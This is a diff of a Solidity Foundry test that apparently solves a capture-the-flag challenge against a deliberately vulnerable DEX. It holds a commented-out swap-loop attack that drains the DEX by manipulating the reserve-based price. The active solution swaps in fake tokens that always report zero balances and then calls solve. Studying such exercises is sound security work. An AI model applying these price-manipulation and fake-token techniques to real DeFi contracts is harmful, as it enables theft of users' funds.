@@ -11,8 +11,13 @@ import {IToken2} from "src/sakarkc2122-dex/interfaces/IToken2.sol";
 // Import dependencies for your solution here! //
 //             (if you need any)               //
 ///////////////////////////////////////////////*/
+contract FakeToken {
+    function balanceOf(address account) external view returns (uint256) {
+        return 0;
+    }
+}
 
-contract PomodoroeCTFTest is Test, SakarDEXCTFDeployer {
+contract SakarDEXCTFTest is Test, SakarDEXCTFDeployer {
     IDex public dex;
     IToken1 public token1;
     IToken2 public token2;
@@ -56,11 +61,60 @@ contract PomodoroeCTFTest is Test, SakarDEXCTFDeployer {
         address user = makeAddr("user");
         token1.mint(user, 100);
         token2.mint(user, 100);
-        vm.startPrank(user);
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
+        // vm.startPrank(user);
+
+        // token1.approve(address(dex), type(uint256).max);
+        // token2.approve(address(dex), type(uint256).max);
+
+        // uint256 amountToken1;
+        // uint256 amountToken2;
+        // uint256 swapPrice;
+        // while (token1.balanceOf(address(dex)) > 0 || token2.balanceOf(address(dex)) > 0) {
+        //     console2.log("\nSwap 1 for 2");
+        //     swapPrice = getSwapPrice(address(token1), address(token2), token1.balanceOf(user));
+        //     if (swapPrice == 0) {
+        //         dex.swap(address(token2), address(token1), 0);
+        //         break;
+        //     }
+        //     amountToken1 =
+        //         token2.balanceOf(address(dex)) > swapPrice ? token1.balanceOf(user) : token1.balanceOf(address(dex));
+        //     dex.swap(address(token1), address(token2), amountToken1);
+
+        //     console2.log("User token1 balance", token1.balanceOf(user));
+        //     console2.log("User token2 balance", token2.balanceOf(user));
+        //     console2.log("Dex token1 balance", token1.balanceOf(address(dex)));
+        //     console2.log("Dex token2 balance", token2.balanceOf(address(dex)));
+
+        //     console2.log("\nSwap 2 for 1");
+        //     swapPrice = getSwapPrice(address(token2), address(token1), token2.balanceOf(user));
+        //     if (swapPrice == 0) {
+        //         dex.swap(address(token2), address(token1), 0);
+        //         break;
+        //     }
+        //     amountToken2 =
+        //         token1.balanceOf(address(dex)) > swapPrice ? token2.balanceOf(user) : token2.balanceOf(address(dex));
+        //     dex.swap(address(token2), address(token1), amountToken2);
+
+        //     console2.log("User token1 balance", token1.balanceOf(user));
+        //     console2.log("User token2 balance", token2.balanceOf(user));
+        //     console2.log("Dex token1 balance", token1.balanceOf(address(dex)));
+        //     console2.log("Dex token2 balance", token2.balanceOf(address(dex)));
+        // }
+        FakeToken tokenA = new FakeToken();
+        FakeToken tokenB = new FakeToken();
+        dex.setTokens(address(tokenA), address(tokenB));
+        dex.solve();
 
         assertTrue(dex.isSolved());
     }
+
+    // function getSwapPrice(address tokenIn, address tokenOut, uint256 amount) private view returns (uint256) {
+    //     if (IToken(tokenIn).balanceOf(address(dex)) == 0) {
+    //         return 0;
+    //     }
+    //     return (amount * IToken(tokenOut).balanceOf(address(dex)) / IToken(tokenIn).balanceOf(address(dex)));
+    // }
 }
